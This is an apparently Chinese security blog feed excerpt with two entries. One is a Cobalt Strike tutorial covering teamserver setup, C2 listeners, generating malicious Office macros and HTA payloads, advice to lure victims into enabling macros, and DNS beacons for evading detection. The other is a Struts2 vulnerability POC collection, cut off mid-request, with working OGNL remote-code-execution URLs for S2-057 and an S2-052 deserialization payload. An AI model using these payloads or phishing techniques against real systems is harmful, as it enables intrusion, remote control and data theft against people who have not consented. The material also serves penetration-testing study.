        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Cobaltstrike框架介绍"><a href="#Cobaltstrike框架介绍" class="headerlink" title="Cobaltstrike框架介绍"></a>Cobaltstrike框架介绍</h2><h3 id="Cobaltstrike简介"><a href="#Cobaltstrike简介" class="headerlink" title="Cobaltstrike简介"></a>Cobaltstrike简介</h3><p>cobalt strike（简称CS）是一款团队作战渗透测试神器，分为客户端及服务端，一个服务端可以对应多个客户端，一个客户端可以连接多个服务端，可被团队进行分布式协团操作.</p><p>和MSF关系<br>metasploit是一款开源框架，armitage是metasploit框架的图形化界面方式，cobalt strike是armitage的增强版，同时也是收费软件。cobalt strike在2.0版本还是依托metasploit，在3.0之后的版本使用单独的平台。</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>&#x3D;&#x3D;agscript&#x3D;&#x3D;      拓展应用的脚本<br>c2lint  用于检查profile的错误异常<br>&#x3D;&#x3D;teamserver&#x3D;&#x3D;   服务端程序<br>&#x3D;&#x3D;cobaltstrike，cobaltstrike.jar&#x3D;&#x3D;   客户端程序( java跨平台)<br>logs   目录记录与目标主机的相关信息<br>update，update.jar  用于更新CS，一般不用，因为更新了就不是破解版了<br>third-party   第三方工具</p><h3 id="部署teamserver"><a href="#部署teamserver" class="headerlink" title="部署teamserver"></a>部署teamserver</h3><p>需要java环境 默认服务端安装在linux平台</p><pre><code> #!/bin/bashtar -zxvf jdk-8u321-linux-x64.tar.gz -C /usr/lib/echo &quot;export JAVA_HOME=/usr/lib/jdk1.8.0_321/&quot; &gt;&gt; /etc/profileecho &quot;export JRE_HOME=/usr/lib/jdk1.8.0_321/jre&quot; &gt;&gt; /etc/profileecho &quot;export PATH=\$JAVA_HOME/bin:\$JAVA_HOME/jre/bin:\$PATH&quot; &gt;&gt; /etc/profile  echo &quot;export CLASSPATH=\$CLASSPATH:.:\$JAVA_HOME/lib:\$JAVA_HOME/jre/lib&quot; &gt;&gt;/etc/profilesource /etc/profilerm jdk-8u321-linux-x64.tar.gz保存为install.sh，运行chmod +x install.sh，./install.sh执行，执行完成后再执行一次source/etc/profile，然后输入java -version，返回java版本即安装成功。yum search java|grep jdkyum install java-1.8.0-openjdk*</code></pre><p>上传CS到VPS<br>赋予teamserver可执行权限:chmod +x teamserver<br>修改默认端口</p><pre><code>./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]./teamserver 124.223.217.243 121212必填参数host 本服务器外网IP/域名必填参数password Client GUI连接时需要输入的密码可选参数Malleable C2 communication profile 指定C2通信配置文件 该功能体现了CS的强大扩展性可选参数kill date 指定所有payload的终止日期</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430189.png"></p><h3 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h3><p>需要java环境</p><pre><code>Start.bat 这句有问题： java.exe -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512m -Xmx4048m  -jar cobaltstrike.jar  以该命令启动的话，中文会乱码： java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -javaagent:hook.jar -jar cobaltstrike.jar 中文不乱码，以UTF-8启动，并加载中文汉化的jar包（对比两条语句的区别即可知道： java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -Dfile.encoding=UTF-8 -javaagent:CobaltstrikeCN.jar -javaagent:hook.jar -jar cobaltstrike.jar</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430205.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430141.png"></p><h2 id="Cobaltstrike基本使用"><a href="#Cobaltstrike基本使用" class="headerlink" title="Cobaltstrike基本使用"></a>Cobaltstrike基本使用</h2><h3 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h3><p>顶部菜单 主要使用cobaltstrike，View和Attack</p><pre><code>Cobaltstrike菜单New Connection #进行另外一个连接，支持连接多个服务器端 Preferences #设置Cobal Strike界面、控制台、以及输出报告样式TeamServer连接记录。 Visualization #主要展示输出结果的形式 VPN Interfaces #设置VPN接口 Listenrs #创建一个Listener Script Manager #脚本管理 Close #退出连接</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430125.png"></p><h4 id="View菜单"><a href="#View菜单" class="headerlink" title="View菜单"></a>View菜单</h4><pre><code>Applications   # 显示受害主机的应用信息Credentials   # 显示所有以获取的受害主机的凭证，如hashdump、MimikatzDownloads   # 查看已下载文件Event Log   # 主机上线记录以及团队协作聊天记录Keystrokes   # 查看键盘记录结果Proxy Pivots   # 查看代理模块Screenshots   # 查看所有屏幕截图Script Console   # 加载第三方脚本以增强功能 Targets   # 显示所有受害主机Web Log    # 所有Web服务的日志</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430189.png"></p><h4 id="Attack菜单"><a href="#Attack菜单" class="headerlink" title="Attack菜单"></a>Attack菜单</h4><pre><code>packagesHTML Application   # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件MS Office Macro   # 生成office宏病毒文件Payload Generator   # 生成各种语言版本的payloadUSB/CD AutoPlay   # 生成利用自动播放运行的木马文件Windows Dropper   # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)Windows Executable   # 生成可执行exe木马，就是需要什么传什么Windows Executable(Stageless)   # 生成无状态的可执行exe木马,就是所有依赖都打包在一个文件中上传，比较大我们在进行免杀的时候还是尽量使用小一些的分阶段木马也就是Windows Executable</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430213.png"></p><pre><code>Web Drive-by  #钓鱼攻击Manage   #对开启的web服务进行管理Clone Site   #克隆网站，可以记录受害者提交的数据Host File   #提供一个文件下载，可以修改Mime信息Scripted Web Delivery   #为payload提供web服务以便下载和执行 类似于Metasploit的web_delivery Signed Applet Attack   #使用java自签名的程序进行钓鱼攻击(该方式已过时)Smart Applet Attack   #自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本System Profiler   #用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等Spear Phish   #用来邮件钓鱼的模块,鱼叉钓鱼攻击</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430883.png"></p><h4 id="工具栏，即菜单栏中的部分功能"><a href="#工具栏，即菜单栏中的部分功能" class="headerlink" title="工具栏，即菜单栏中的部分功能"></a>工具栏，即菜单栏中的部分功能</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430077.png"></p><pre><code>① Connect to team server：连接服务端② Disonnect from team server：断开当前服务端连接③ Configure Listeners：配置监听器④ Show sessions in graph view：展示会话列表⑤ Show sessions in table view：展示视图列表⑥ Show targets in table view：展示目标列表⑦ Credentials：查看从靶机获取的账户密码⑧ Downloaded Files：查看从靶机下载的文件⑨ Keystrokes：查看键盘记录⑩ Screenshots：查看屏幕截图⑪ Generate Windows Executable (Stageless)：生成无状态的EXE木马⑫ Setup java Signed Applet Attack：开启Web服务为自签名Java Applet提供运行环境⑬ MS Office Macro Attack：生成OFFICE宏病毒文件⑭ Setup Scripted Web-Delivery (Stageless)：开启Web服务，供下载和执行Payload⑮ Host a file：开启Web服务，供下载文件⑯ Manage Web Server：管理Web服务⑰ Help：帮助文档⑱ About：关于Cobalt Strike</code></pre><h4 id="团队协作"><a href="#团队协作" class="headerlink" title="团队协作"></a>团队协作</h4><p>1、多个客户端连接同一个服务端<br>注意：</p><ul><li><strong>linux启动客户端</strong>：在cs4.3文件夹中有有一个.sh的文件，赋予执行权限后，使用脚本即可在Linux快速的启动cs</li><li><strong>windows启动客户端</strong>：.bat文件启动<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430891.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430077.png"><br>2、一个客户端连接多个服务端<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430085.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430988.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430523.png"></li></ul><h2 id="Cobaltstrike监听器详解"><a href="#Cobaltstrike监听器详解" class="headerlink" title="Cobaltstrike监听器详解"></a>Cobaltstrike监听器详解</h2><blockquote><p><a href="http://blog.leanote.com/post/snowming/50448511de58">http://blog.leanote.com/post/snowming/50448511de58</a></p></blockquote><h4 id="beacon"><a href="#beacon" class="headerlink" title="beacon"></a>beacon</h4><p>beacon指的是受害者与我们的teamserver所建立的这个连接，也可以理解成我们所获的的对方主机的控制权</p><h4 id="listeners"><a href="#listeners" class="headerlink" title="listeners"></a>listeners</h4><p>Listener是用来接收Beacon请求信息的Cobalt Strike模块<br>其中包含DNS、HTTP、SMB、tcp为内置listener。各种上线方式<br>SMB和tcp是横向移动相关的<br>C2是流量隐藏相关的<br>&#x3D;&#x3D;Foreign为外部结合的Listener&#x3D;&#x3D;，常用于MSF的结合，例如获取meterpreter到MSF上，与msf联动<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430740.png"></p><h4 id="创建listener"><a href="#创建listener" class="headerlink" title="创建listener"></a>创建listener</h4><p>Beacon HTTP&amp;HTTPS(以HTTP或HTTPS协议流量建立Beacon连接)</p><pre><code>NAME:监听器名Payload:创建监听器所选用的payload和传输协议HTTP Hosts:回连主机Host Rotation Strategy:cs4.3新增在beacon通信时，可以选择更多的轮询方案以逃避检测、阻断，beacon回连主机策略，通俗来讲就是流量检测绕过的方式，但是，cs是开源的所以其流量特征都会被标记HTTP Host(stager):配置Stager主机，仅当Payload明确需要Stager配合时有效Profile：Malleable C2配置文件，用于自定义通信流量特征HTTPS Port (C2)：Beacon回连的监听端口HTTPS Port (Bind)：绑定监听端口，实现端口重定向HTTPS Host Header：设置内层真实域名，在使**用域前置技术**时使用，设置DNS时搞HTTPS Proxy：为Payload指定代理</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430829.png"></p><p>Beacon DNS（以DNS协议流量建立Beacon连接）</p><p>DNS Hosts：Beacon回连的主机，可以添加多个<br>Host Rotation Strategy：Beacon回连主机策略，<br>HTTP Host (Stager)：配置Stager主机，仅当Payload明确需要Stager配合时有效<br>Profile：Malleable C2配置文件，用于自定义通信流量特征<br>DNS Port (Bind)：绑定监听端口，实现端口重定向<br>DNS Resolver：指定NS服务器<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430711.png"></p><p>Beacon SMB（以SMB协议流量建立Beacon连接）适用于内网横向<br>windows&#x2F;beacon_smb&#x2F;bind_pipe</p><p>官网介绍:SMB Beacon使用&#x3D;&#x3D;命名管道&#x3D;&#x3D;通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p><p>前提条件<br>&#x3D;&#x3D;具有 SMB Beacon 的主机必须接受 445 端口上的连&#x3D;&#x3D;接。<br>只能链接由同一个 Cobalt Strike 实例管理的 Beacon。<br>利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430829.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430873.png"></p><p>Beacon tcp(仅与父 Beacon 通信)适用于内网横向移动<br>windows&#x2F;beacon_tcp&#x2F;bind_tcp<br>命令格式同smb相似，不过此处连接目标IP的命令不是link，而是connect。取消连接目标机器的话对应的命令与smb同为unlink<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430225.png"></p><h2 id="Cobaltstrike上线Beacon"><a href="#Cobaltstrike上线Beacon" class="headerlink" title="Cobaltstrike上线Beacon"></a>Cobaltstrike上线Beacon</h2><h3 id="Beacon使用"><a href="#Beacon使用" class="headerlink" title="Beacon使用"></a>Beacon使用</h3><p>在目标上线CS后，&#x3D;&#x3D;右键目标interact使用Beacon&#x3D;&#x3D;</p><p>Tips:在Cobalt Strike中它的&#x3D;&#x3D;心跳&#x3D;&#x3D;默认是60s(即sleep时间为60s，每一分钟目标主机与teamserver通信一次)<br>如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。所以拿到beacon一般先执行sleep<br>大家可以根据实战环境来调节，建议不要太快，不然流量会很明显。</p><p>Tips：&#x3D;&#x3D;beacon中不能直接输入cmd命令，比如要让目标机执行ipconfig这条cmd命令，对应的beacon命令是shell ipconfig&#x3D;&#x3D;</p><p>&#x3D;&#x3D;其他的beacon命令，可以在beacon中输入help&#x3D;&#x3D;<br>上线完才能搞这些<br>一般来说，cs时用来钓鱼或者是进行域渗透或者是横向移动</p><h3 id="Office钓鱼"><a href="#Office钓鱼" class="headerlink" title="Office钓鱼"></a>Office钓鱼</h3><p>当无法从web找到突破口时，可以尝试钓鱼打入内网<br>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本<br>&#x3D;&#x3D;注意：这个宏钓鱼太厉害，微软很多时候都禁用了这个，需要开启宏，才能进行操作，需要暗示或者是引导受害者开启宏&#x3D;&#x3D;</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>1.CS开启listener<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430277.png"><br>2.点击攻击——&gt;生成后门——&gt;MS Office Macro ——&gt;选择一个监听器，点击Generate</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430318.png"><br>3.复制生成的vb恶意代码<br>4.打开word编辑器，在工具栏中找到视图，查看宏<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430558.png"><br>5.创建宏名进入<br>6.找到ThisDocument，并将CS生成的代码复制进去保存<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430439.png"><br>7.然后保存为doc或者启用宏的word文档<br>8.打开后启用宏即可上线<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430447.png"></p><h3 id="Cobaltstrike实战演示"><a href="#Cobaltstrike实战演示" class="headerlink" title="Cobaltstrike实战演示"></a>Cobaltstrike实战演示</h3><h4 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h4><p>当我们拥有webshell或者有命令执行权限时，我们可以通过&#x3D;&#x3D;远程加载或者生成木马&#x3D;&#x3D;上线<br><strong>远程加载</strong>是没有文件落地的一个上传方式</p><h4 id="远程加载上线CS"><a href="#远程加载上线CS" class="headerlink" title="远程加载上线CS"></a>远程加载上线CS</h4><p>AttackWeb Drive-by Scripted Web Delivery<br>&#x3D;&#x3D;一般的从web漏洞入侵后，拿到一个shell，<br>接下来就使用下面的方法，生成命令，运行之，在远程机器上上线cs，控制机器&#x3D;&#x3D;</p><h5 id="远程加载上线一"><a href="#远程加载上线一" class="headerlink" title="远程加载上线一"></a>远程加载上线一</h5><p>1.生成远程木马<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430840.png"><br>2.配置参数<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430848.png"><br>3.在目标机器上执行上线<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430988.png"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430052.png"></p><h5 id="远程加载上线二"><a href="#远程加载上线二" class="headerlink" title="远程加载上线二"></a>远程加载上线二</h5><p>需要借助hta！什么是hta？<br>HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别<br>例子：<br>把上面的代码复制到任意文本编辑器中，然后保存为*.hta，直接双击就可以看到效果。</p><pre><code>&lt;!--example1.hta--&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;第一个HTA的例子&lt;/title&gt;&lt;style&gt;p&#123;font-size:24;cursor:hand&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;p&gt;HTAHTMLApplicationHTML应用程序&lt;/p&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430098.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430138.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430346.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430440.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430488.png"><br>&#x3D;&#x3D;当然了，也可以直接运行hta文件上线，这个地方是利用mshta命令执行hta上线&#x3D;&#x3D;<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430657.png"></p><h5 id="通过生成后门上线"><a href="#通过生成后门上线" class="headerlink" title="通过生成后门上线"></a>通过生成后门上线</h5><p>&#x3D;&#x3D;当拥有webshell可以通过webshell上传木马文件上线CS(若有杀软需做免杀处理)&#x3D;&#x3D;</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430733.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430713.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430841.png"></p><h5 id="Powershell本地加载上线CS"><a href="#Powershell本地加载上线CS" class="headerlink" title="Powershell本地加载上线CS"></a>Powershell本地加载上线CS</h5><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430063.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430039.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430189.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430335.png"></p><h4 id="通过DNS-beacon上线"><a href="#通过DNS-beacon上线" class="headerlink" title="通过DNS beacon上线"></a>通过DNS beacon上线</h4><p>&#x3D;&#x3D;这个是可以绕过一些流量监听器&#x3D;&#x3D;<br>第一步 配置dns beacon监听器<br>1.配置name为随意名。<br>2.payload为beacon DNS<br>3.DNS Hosts为ns记录但如没有域名则可以填写其他网站域名<br>4.DNS Host为A记录填写自己的域名。如若没有则填其他网站域名，注意需要和DNS Host一致，如若拥有域名则可填写A记录<br>5.DNS port 需要填写为53端口填写其他的则不会成功。 &#x2F;&#x2F;这里需要注意再vps上可能默认是被systemd-resolved 服务占用那我们就要进行修改此服务占用端口了<br>6.DNS Resolver 此处需要填写cs服务器的真实地址不然目标机器无法找到我们的cs服务器</p><p>端口被占用怎么办？</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430323.png"></p><h5 id="端口占用解决方法"><a href="#端口占用解决方法" class="headerlink" title="端口占用解决方法"></a>端口占用解决方法</h5><p>1.通过netstat -anoutp | grep 53命令查看53端口是否被占用如被占用则会显示下方图片中的情况，后面会有服务名称</p><p>2.停用systemd-resolved服务，使用命令<br>systemctl stop systemd-resolved<br>这个服务是必须要有的一个服务，但是端口被占用了怎么办呢？<br>！！修改配置文件，改这个服务的端口<br>3.通过vi命令编辑vi &#x2F;etc&#x2F;systemd&#x2F;resolved.conf此文件为下图内容即可</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430590.png"><br>4.通过此命令ln -sf &#x2F;run&#x2F;systemd&#x2F;resolve&#x2F;resolv.conf &#x2F;etc&#x2F;resolv.conf生成一个软连接，<br>5.再重启此服务即可<br>重启命令为 systemctl start systemd-resolved<br>再通过 netstat -anoutp | grep 53 查看可发现没有返回了<br>至此修改成功，我们的监听器也就可以进行配置了。</p><p>第三步，运行beacon.exe文件即可上线，成功后会上线一个小黑框，此时则需要通过鼠标右击选定第一个进入，输入checkin命令强制对方主机会连到我们的cs服务器即可获取会话。</p><p>这种方式上线之后会是一个黑方框<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430622.png" alt="image-20221007142837169"><br>这个时候我们要，使用命令：checkin强制回连我们<br>等待后就可以上线和其他的一样了</p><p>注意：dns上传时，流量会很小，因此上传文件会很慢<br>使用mode dns-txt加快点速度<br>可以截图<br>可以浏览文件</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071430858.png" alt="image-20221007142816086" style="zoom:50%;" />VNC是连接后的远程桌面取消勾选小黑客图表就可以对远程桌面进行控制<h1 id="上线Linux"><a href="#上线Linux" class="headerlink" title="上线Linux"></a>上线Linux</h1><p>cs如果相对linux攻击需要添加脚本文件<br>cs一般是攻击windows的渗透框架</p><blockquote><p>在cs扩展那篇文章有讲怎么上线Linux</p></blockquote><blockquote><p><a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a> </p><p><a href="https://github.com/darkr4y/geacon">https://github.com/darkr4y/geacon</a> 这个也可可以上线Linux</p><p>参考过程：<a href="http://www.adminxe.com/1287.html">http://www.adminxe.com/1287.html</a></p></blockquote><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Attack </category>
          
          <category> CobaltStrike </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Struts2框架漏洞POC集合</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/Struts2%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9EPOC%E9%9B%86%E5%90%88.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/Struts2%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9EPOC%E9%9B%86%E5%90%88.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="史上最全Struts2-漏洞复现合集1"><a href="#史上最全Struts2-漏洞复现合集1" class="headerlink" title="史上最全Struts2 漏洞复现合集1"></a>史上最全Struts2 漏洞复现合集1</h3><p><a href="https://zhuanlan.zhihu.com/p/183876381">https://zhuanlan.zhihu.com/p/183876381</a></p><h3 id="struts2-057"><a href="#struts2-057" class="headerlink" title="struts2-057"></a>struts2-057</h3><h4 id="弹出计算器"><a href="#弹出计算器" class="headerlink" title="弹出计算器"></a>弹出计算器</h4><p>(2.3.20版本)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%24%7B%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C@java.lang.Runtime@getRuntime%28%29.exec%28%27calc.exe%27%29%7D/index.action</span><br></pre></td></tr></table></figure><p>(2.3.34版本)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D@java.lang.Runtime@getRuntime%28%29.exec%28%22calc%22%29%29%7D/index.action</span><br></pre></td></tr></table></figure><h4 id="命令回显"><a href="#命令回显" class="headerlink" title="命令回显"></a>命令回显</h4><blockquote><p>两个版本都是利用com.opensymphony.xwork2.dispatcher.HttpServletResponse对象去打印命令执行后的回显数据</p></blockquote><p>2.3.20 版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action</span><br></pre></td></tr></table></figure><p>2.3.34 版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action</span><br></pre></td></tr></table></figure><h3 id="struts2-052"><a href="#struts2-052" class="headerlink" title="struts2-052"></a>struts2-052</h3><blockquote><p>（影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST http://127.0.0.1:8080/struts2-rest-showcase/orders HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 1963</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/new</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: JSESSIONID=1EF0BA9085CFFA2944901297746FE081</span><br><span class="line"></span><br><span class="line">&lt;map&gt; </span><br><span class="line">&lt;entry&gt; </span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">&lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">&lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">&lt;dataHandler&gt;</span><br><span class="line">&lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">&lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">&lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">&lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">&lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">&lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">&lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">&lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">&lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;command&gt;</span><br><span class="line">&lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">&lt;/command&gt;</span><br><span class="line">&lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">&lt;/next&gt;</span><br><span class="line">&lt;/iter&gt;</span><br><span class="line">&lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">&lt;method&gt;</span><br><span 